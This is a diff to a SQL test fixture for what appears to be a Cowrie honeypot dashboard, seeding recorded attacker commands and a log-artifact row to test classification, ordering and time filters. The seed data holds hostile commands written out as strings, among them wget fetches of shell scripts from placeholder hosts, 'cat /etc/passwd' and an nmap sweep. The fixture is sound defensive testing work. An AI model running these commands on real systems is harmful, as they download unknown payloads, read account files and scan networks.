@@ -68,32 +68,46 @@ VALUES
 -- cowrie_unique_commands is maintained by the ingest endpoint, not by a
 -- trigger, so it has to be seeded alongside. Mirrors the commands above.
 -- total_events/unique_ips are invented; only their ordering is asserted.
-INSERT INTO cowrie_unique_commands (command, first_seen, last_seen, total_events, unique_ips)
+--
+-- record_class is set explicitly because these rows bypass the ingest path
+-- that would otherwise classify them (migration 013), and the column defaults
+-- to 'unknown' — which every endpoint filters out. Without this the whole
+-- command surface would assert against an empty result and still return 200.
+-- The artifact row at the end is the one that makes the filter observable:
+-- with only real commands seeded, a broken filter would pass.
+INSERT INTO cowrie_unique_commands (command, record_class, first_seen, last_seen, total_events, unique_ips)
 VALUES
-  ('uname -a',                    now() - interval '59 min', now() - interval '59 min', 1, 1),
-  ('cat /proc/cpuinfo',           now() - interval '58 min', now() - interval '58 min', 1, 1),
-  ('wget http://1.2.3.4/bins.sh', now() - interval '57 min', now() - interval '57 min', 5, 2),
-  ('rm -rf /tmp/bins.sh',         now() - interval '56 min', now() - interval '56 min', 3, 1),
-  ('busybox wget http://x/y.sh',  now() - interval '43 min', now() - interval '43 min', 2, 1),
+  ('uname -a',                    'command', now() - interval '59 min', now() - interval '59 min', 1, 1),
+  ('cat /proc/cpuinfo',           'command', now() - interval '58 min', now() - interval '58 min', 1, 1),
+  ('wget http://1.2.3.4/bins.sh', 'command', now() - interval '57 min', now() - interval '57 min', 5, 2),
+  ('rm -rf /tmp/bins.sh',         'command', now() - interval '56 min', now() - interval '56 min', 3, 1),
+  ('busybox wget http://x/y.sh',  'command', now() - interval '43 min', now() - interval '43 min', 2, 1),
   -- A delivery host on a non-standard port. Production had one of these and the
   -- defanger bracketed every dot in it, because the port travelled inside the
   -- host capture and made the address test fail. Nothing in the seed carried a
   -- port, so nothing caught it.
-  ('wget http://9.8.7.6:8080/x',  now() - interval '41 min', now() - interval '41 min', 4, 1),
-  ('nmap -sS 10.0.0.0/8',         now() - interval '29 min', now() - interval '29 min', 1, 1),
-  ('echo hello',                  now() - interval '14 min', now() - interval '14 min', 1, 1),
-  ('cat /etc/passwd',             now() - interval '19 min', now() - interval '19 min', 6, 1),
+  ('wget http://9.8.7.6:8080/x',  'command', now() - interval '41 min', now() - interval '41 min', 4, 1),
+  ('nmap -sS 10.0.0.0/8',         'command', now() - interval '29 min', now() - interval '29 min', 1, 1),
+  ('echo hello',                  'command', now() - interval '14 min', now() - interval '14 min', 1, 1),
+  ('cat /etc/passwd',             'command', now() - interval '19 min', now() - interval '19 min', 6, 1),
   -- Deliberately older than 24h but inside 7d. /iocs?type=commands windows
   -- on last_seen, and with every other row minutes old there was nothing
   -- for that filter to exclude — it would have passed while doing nothing.
   -- Matches no MITRE pattern, so the tag assertions are unaffected.
-  ('crontab -l',                  now() - interval '41 hours', now() - interval '40 hours', 2, 1)
+  ('crontab -l',                  'command', now() - interval '41 hours', now() - interval '40 hours', 2, 1),
+  -- A Cowrie log line, not a typed command. 99.76% of the production table is
+  -- this kind of row, and for 25 minutes after the Phase 0 backfill one of
+  -- them sat at the top of the public leaderboard with 756,238 hits. It is
+  -- seeded with a larger total_events than any real command precisely so that
+  -- a regression puts it first and the ordering assertions catch it.
+  ('Remote SSH version: SSH-2.0-Go', 'log_artifact', now() - interval '50 min', now() - interval '10 min', 999, 9)
 -- Authoritative, not DO NOTHING: since migration 011 the trigger populates
 -- this table from the events above, so a DO NOTHING here would leave CI
 -- asserting against trigger-derived counts that drift with the fixture. These
 -- invented values keep the ordering assertions deterministic. The trigger's
 -- own command path is covered by the ingest POST further down.
 ON CONFLICT (command_sha256) DO UPDATE SET
+  record_class = EXCLUDED.record_class,
   first_seen   = EXCLUDED.first_seen,
   last_seen    = EXCLUDED.last_seen,
   total_events = EXCLUDED.total_events,
